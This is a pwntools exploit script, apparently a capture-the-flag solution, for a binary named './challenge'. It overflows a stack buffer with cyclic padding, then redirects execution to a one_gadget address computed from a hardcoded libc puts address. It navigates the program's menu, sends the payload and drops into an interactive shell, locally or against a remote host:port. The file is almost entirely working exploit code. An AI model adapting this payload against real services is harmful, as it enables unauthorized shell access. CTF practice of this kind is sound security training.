#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './challenge'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# elf, libc # ASLR is disable
text = 0x56555000
puts = 0xf7e78b80
libc = puts-libc.sym['puts']
# info_addr('libc',libc)
got = 0x56559000

# gadget
og_off = 0x3ac3c
og = libc+og_off
info_addr('one_gadget',og)

# rop1
offset = cyclic_find('haaa')-8
payload = cyclic(offset)
payload += p32(got)
payload += p32(0xdeadbeef)
# payload += p32(text+elf.plt['puts']) + p32(0xdeadbeef) + p32(text+elf.got['puts']) 
payload += p32(og)
payload += p32(0)*100 # fill stack with '\x00'

sla('Your choice: ','2')
sla('Choose a room to enter: ','4')
sla('Your choice: ','3')
sla('Press Q to exit: ','Stephen')
# debug('b *0x56556684')
sla('Enter something: ',payload)
# puts = uu32(rc(4))
# info_addr('puts',puts)
p.interactive()